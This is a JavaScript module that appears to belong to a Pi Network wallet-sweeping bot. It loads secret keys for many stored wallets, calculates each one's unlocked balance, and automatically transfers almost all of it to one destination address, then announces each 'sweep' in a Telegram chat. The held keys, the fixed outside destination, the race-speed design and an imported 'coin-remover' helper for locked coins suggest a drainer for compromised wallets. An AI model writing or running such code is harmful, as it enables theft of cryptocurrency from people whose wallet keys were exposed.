/**
 * Ultimate Millisecond Hyper-Sweeper Engine
 * Accurately calculates true spendable available balance vs locked portions.
 */

const StellarSdk = require('@stellar/stellar-sdk');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
const NETWORK_PASSPHRASE = 'Pi Network';

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
    try {
        const server = new StellarSdk.Horizon.Server(horizonUrl);
        const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
        const sourcePublicKey = sourceKeypair.publicKey();

        const account = await server.loadAccount(sourcePublicKey);
        const balances = account.balances || [];

        let totalBalance = 0;
        let lockedBalance = 0;
        let availableBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                totalBalance = parseFloat(b.balance || 0);
                // Check standard locked balance or custom Pi lockup fields
                lockedBalance = parseFloat(b.locked_balance || 0);
            }
        });

        // Inspect deeper lockups via coin-remover
        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.lockedAmount > lockedBalance) {
            lockedBalance = lockupInfo.lockedAmount;
        }

        // True available balance = Total minus Locked (matching your Pi app display)
        availableBalance = totalBalance - lockedBalance;

        console.log(`[Wallet #${wallet.id}] Total: ${totalBalance} | Locked: ${lockedBalance} | True Available: ${availableBalance}`);

        // Minimum threshold set to catch your 0.1507631 Pi balance
        const minSweepThreshold = 0.005; 

        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS) {
            // Leave 0.001 Pi for network fees, sweep the rest of the available balance
            const sweepAmount = (availableBalance - 0.001).toFixed(7);
            if (parseFloat(sweepAmount) <= 0) return;

            console.log(`[Real Sweeper] Sweeping true available balance of ${sweepAmount} Pi from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);

            const feeMultiplier = 5;
            const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);

            const transaction = new StellarSdk.TransactionBuilder(account, {
                fee: dynamicFee,
                networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
                destination: DESTINATION_ADDRESS,
                asset: StellarSdk.Asset.native(),
                amount: sweepAmount
            }))
            .setTimeout(30)
            .build();

            transaction.sign(sourceKeypair);

            const result = await server.submitTransaction(transaction);
            console.log(`[Real Sweeper] SUCCESS! Transaction hash: ${result.hash}`);

            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);

            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `🚨 **AVAILABLE BALANCE SWEEP SUCCESS**\n` +
                    `📦 **Wallet Box ID:** #${wallet.id}\n` +
                    `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                    `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                    `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
                    `⚡ *Status:* True available balance cleared successfully!`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (error) {
        console.error(`[Real Sweeper] Error sweeping wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
